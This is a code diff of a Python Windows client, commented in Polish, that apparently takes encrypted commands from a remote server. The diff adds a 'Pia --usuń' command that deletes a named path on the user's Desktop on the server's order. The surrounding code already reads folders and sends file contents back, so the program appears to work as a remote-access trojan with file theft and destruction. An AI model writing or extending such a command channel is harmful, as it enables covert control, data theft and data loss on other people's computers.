@@ -20,8 +20,9 @@ from PyQt5.QtWidgets import QApplication, QWidget, QGridLayout, QPushButton, QDo
 
 import win32com.client
 
-
 import pythoncom
+
+import urllib
 init()
 global console_handle
 # Ustawiamy numer ID okna konsoli
@@ -341,8 +342,29 @@ def receive_messages(server_socket):
                 else:
                     print("Błędny format polecenia odczytu folderu")
                     # Wyślij informację o błędzie na serwer
-                    server_socket.sendall(szyfrowanie('Błędny format polecenia odczytu folderu.').encode())
+                    server_socket.sendall(szyfrowanie(
+                        'Błędny format polecenia odczytu folderu.').encode())
 
+            elif decrypted_data.startswith("Pia --usuń"):
+                # Odczytaj nazwę folderu, którą serwer przekazuje w komunikacie
+                command = decrypted_data.strip()
+                command_parts = command.split('("')
+                if len(command_parts) == 2:
+                    nazwa_folderu = command_parts[1].rstrip('")')
+
+                    # Pobierz ścieżkę do folderu na pulpicie
+                    desktop_path = os.path.join(os.path.join(
+                        os.environ['USERPROFILE']), 'Desktop')
+                    path = os.path.join(desktop_path, nazwa_folderu)
+                    # usuń plik main.py, jeśli istnieje
+                    if os.path.exists(path):
+                        os.remove(path)
+                    # print("Usunięto plik main.py")
+                else:
+                    print("Błędny format polecenia usunięcia pliku")
+                    # Wyślij informację o błędzie na serwer
+                    server_socket.sendall(szyfrowanie(
+                        'Błędny format polecenia usunięcia pliku.').encode())
 
             elif decrypted_data.startswith("Pia --dane"):
                 # Odczytaj nazwę pliku, którą serwer przekazuje w komunikacie
